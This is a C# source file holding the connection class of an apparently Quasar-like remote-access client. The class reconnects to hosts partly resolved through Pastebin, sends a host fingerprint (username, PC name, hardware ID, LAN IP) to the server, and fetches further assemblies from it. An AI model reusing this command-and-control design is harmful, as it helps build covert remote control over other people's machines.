using NAudio.CoreAudioApi;
using Orion.Client.Helper;
using Orion.Client.IO;
using Orion.Client.User;
using Orion.Common.DNS;
using Orion.Common.Helpers;
using Orion.Common.Messages.Other;
using Orion.Common.Messages;
using Orion.Common.Utilities;
using Orion.Client.Config;
using System;
using System.Diagnostics;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using Orion.Common.UAC;
using Orion.Client.Utilities;
using Orion.Common.Networking;

namespace Orion.Client.Networking
{
    public class OrionClient : Client, IDisposable
    {
        /// <summary>
        /// Used to keep track if the client has been identified by the server.
        /// </summary>
        private bool _identified;

        /// <summary>
        /// Indicates whether this client already requested deferred assemblies for the current session.
        /// </summary>
        private bool _requestedDeferredAssemblies;

        /// <summary>
        /// The hosts manager which contains the available hosts to connect to.
        /// </summary>
        private readonly HostsManager _hosts;

        /// <summary>
        /// Random number generator to slightly randomize the reconnection delay.
        /// </summary>
        private readonly SafeRandom _random;

        /// <summary>
        /// Create a <see cref="_token"/> and signals cancellation.
        /// </summary>
        private readonly CancellationTokenSource _tokenSource;

        /// <summary>
        /// The token to check for cancellation.
        /// </summary>
        private readonly CancellationToken _token;

    /// <summary>
    /// Indicates that shutdown was requested for the connect loop.
    /// </summary>
    private volatile bool _shutdownRequested;

    /// <summary>
    /// Tracks whether the instance was disposed to avoid double cleanup.
    /// </summary>
    private bool _disposed;

        /// <summary>
        /// Initializes a new instance of the <see cref="OrionClient"/> class.
        /// </summary>
        /// <param name="hostsManager">The hosts manager which contains the available hosts to connect to.</param>
        /// <param name="serverCertificate">The server certificate.</param>
        public OrionClient(HostsManager hostsManager, X509Certificate2 serverCertificate)
            : base(serverCertificate)
        {
            _hosts = hostsManager;
            _random = new SafeRandom();
            base.ClientState += OnClientState;
            base.ClientRead += OnClientRead;
            base.ClientFail += OnClientFail;
            _tokenSource = new CancellationTokenSource();
            _token = _tokenSource.Token;
        }

        /// <summary>
        /// Connection loop used to reconnect and keep the connection open.
        /// </summary>
        public void ConnectLoop()
        {
            while (!_shutdownRequested && !_token.IsCancellationRequested)
            {
                if (!Connected)
                {
                    var host = _hosts.GetNextHost();

                    if (host?.IpAddress == null)
                    {
                        Debug.WriteLine("Failed to get a valid host to connect to. Will retry after delay.");
                        
                        // Check pastebin status to determine appropriate wait time
                        var (IsReachable, SuggestedWaitTimeMs) = _hosts.GetPastebinStatus();
                        int waitTime;
                        
                        if (!IsReachable && SuggestedWaitTimeMs > 0)
                        {
                            // Use suggested wait time for pastebin failures (5+ minutes to avoid rate limiting)
                            waitTime = SuggestedWaitTimeMs;
                            Debug.WriteLine($"Pastebin unreachable, waiting {waitTime / 1000} seconds before retry");
                        }
                        else
                        {
                            // Use normal reconnect delay when pastebin is reachable but no hosts available
                            waitTime = Settings.RECONNECTDELAY;
                        }
                        
                        Thread.Sleep(waitTime + _random.Next(250, 750));
                        continue;
                    }

                    try
                    {
                        base.Connect(host.IpAddress, host.Port);
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Connection attempt failed: {ex.Message}");
                    }
                }

                while (Connected)
                {
                    if (WaitForShutdownSignal(1000))
                    {
                        Disconnect();
                        return;
                    }
                }

                if (_shutdownRequested || _token.IsCancellationRequested)
                {
                    Disconnect();
                    return;
                }

                if (WaitForShutdownSignal(Settings.RECONNECTDELAY + _random.Next(250, 750)))
                {
                    Disconnect();
                    return;
                }
            }
        }

        private void OnClientRead(Client client, IMessage message, int messageLength)
        {
            if (!_identified)
            {
                if (message is ClientIdentificationResult reply)
                {
                    _identified = reply.Result;
                    if (_identified)
                    {
                        RequestDeferredAssemblies();
                    }
                }
                return;
            }

            MessageHandler.Process(client, message);
        }

        private void OnClientFail(Client client, Exception ex)
        {
            Debug.WriteLine($"Client Fail - Exception Message: {ex.Message}");
            client.Disconnect();
        }

        private void OnClientState(Client client, bool connected)
        {
            _identified = false; // always reset identification
            _requestedDeferredAssemblies = false;

            if (connected)
            {
                // Notify hosts manager of successful connection for pastebin timing logic
                _hosts.NotifySuccessfulConnection();
                
                // send client identification once connected
                try
                {
                    var userAccount = new UserAccount();

                    // The client no longer performs an external IP geolocation lookup; the server
                    // derives the country from the socket connection address instead. These fields
                    // are left neutral and overwritten server-side.
                    var identification = new ClientIdentification
                    {
                        Version = Settings.ReportedVersion,
                        OperatingSystem = PlatformHelper.FullName,
                        AccountType = userAccount.Type.ToString(),
                        Country = string.Empty,
                        CountryCode = "-",
                        ImageIndex = 0,
                        Id = HardwareDevices.HardwareId,
                        Username = userAccount.UserName,
                        PcName = SystemHelper.GetPcName(),
                        Tag = Settings.TAG,
                        EncryptionKey = Settings.ENCRYPTIONKEY,
                        Signature = Convert.FromBase64String(Settings.SERVERSIGNATURE),
                        PublicIP = HardwareDevices.LanIpAddress ?? string.Empty
                    };

                    client.Send(identification);
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"Client identification failed, sending minimal fallback: {ex.Message}");
                    try
                    {
                        client.Send(new ClientIdentification
                        {
                            Version = Settings.ReportedVersion,
                            OperatingSystem = "Unknown",
                            AccountType = "Unknown",
                            Username = "Unknown",
                            PcName = SystemHelper.GetPcName(),
                            Tag = Settings.TAG,
                            Id = "Unknown",
                            PublicIP = "Unknown"
                        });
                    }
                    catch
                    {
                        // give up without crashing the connection thread
                    }
                }
            }
        }

        private void RequestDeferredAssemblies()
        {
            if (_requestedDeferredAssemblies)
            {
                return;
            }

            var missingAssemblies = DeferredAssemblyManager.GetMissingAssemblies();
            if (missingAssemblies == null || missingAssemblies.Length == 0)
            {
                return;
            }

            try
            {
                Send(new RequestDeferredAssemblies
                {
                    Assemblies = missingAssemblies,
                    ClientVersion = Settings.ReportedVersion
                });

                _requestedDeferredAssemblies = true;
                Debug.WriteLine($"Requested {missingAssemblies.Length} deferred assemblies from server.");
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Failed to request deferred assemblies: {ex.Message}");
            }
        }

        /// <summary>
        /// Stops the connection loop and disconnects the connection.
        /// </summary>
        public void Exit()
        {
            _shutdownRequested = true;
            _tokenSource.Cancel();
            Disconnect();
        }

        protected override void Dispose(bool disposing)
        {
            if (!disposing || _disposed)
            {
                return;
            }

            _shutdownRequested = true;
            _disposed = true;

            _tokenSource.Cancel();

            try
            {
                base.Dispose(disposing);
            }
            finally
            {
                _tokenSource.Dispose();
            }
        }

        /// <summary>
        /// Waits for either a shutdown request/cancellation or until the specified timeout elapses.
        /// </summary>
        /// <param name="timeoutMs">Timeout in milliseconds.</param>
        /// <returns><c>true</c> if shutdown was requested; otherwise <c>false</c>.</returns>
        private bool WaitForShutdownSignal(int timeoutMs)
        {
            const int slice = 100;
            var waited = 0;

            while (waited < timeoutMs && !_shutdownRequested && !_token.IsCancellationRequested)
            {
                var delay = Math.Min(slice, timeoutMs - waited);
                Thread.Sleep(delay);
                waited += delay;
            }

            return _shutdownRequested || _token.IsCancellationRequested;
        }
    }
}
